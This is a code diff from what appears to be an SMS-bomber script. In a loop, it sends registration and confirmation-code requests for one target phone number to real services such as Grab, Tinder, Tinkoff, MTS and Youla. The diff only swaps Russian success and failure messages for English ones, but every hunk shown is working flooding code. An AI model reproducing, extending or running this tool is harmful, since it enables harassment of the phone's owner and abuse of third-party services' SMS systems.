@@ -32,45 +32,45 @@ def infinity():
 		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
 		try:
 			requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-			print('[+] Grab отправлено!')
+			print('[✔] Successful')
 		except:
-			print('[-] Не отправлено!')
+			print('[✖] Failed !')
 
 		try:
 			requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
-			print('[+] RuTaxi отправлено!')
+			print('[✔] Successful')
 		except:
-			print('[-] Не отправлено!')
+			print('[✖] Failed !')
 
 		try:
 			requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
-			print('[+] BelkaCar отправлено!')
+			print('[✔] Successful')
 		except:
-			print('[-] Не отправлено!')
+			print('[✖] Failed !')
 
 		try:
 			requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
-			print('[+] Tinder отправлено!')
+			print('[✔] Successful')
 		except:
-			print('[-] Не отправлено!')
+			print('[✖] Failed !')
 
 		try:
 			requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
-			print('[+] Karusel отправлено!')
+			print('[✔] Successful')
 		except:
-			print('[-] Не отправлено!')
+			print('[✖] Failed !')
 
 		try:
 			requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
-			print('[+] Tinkoff отправлено!')
+			print('[✔] Successful')
 		except:
-			print('[-] Не отправлено!')
+			print('[✖] Failed !')
 
 		try:
 			requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
-			print('[+] MTS отправлено!')
+			print('[✔] Successful')
 		except:
-			print('[-] Не отправлено!')
+			print('[✖] Failed !')
 
 		try:
 			requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
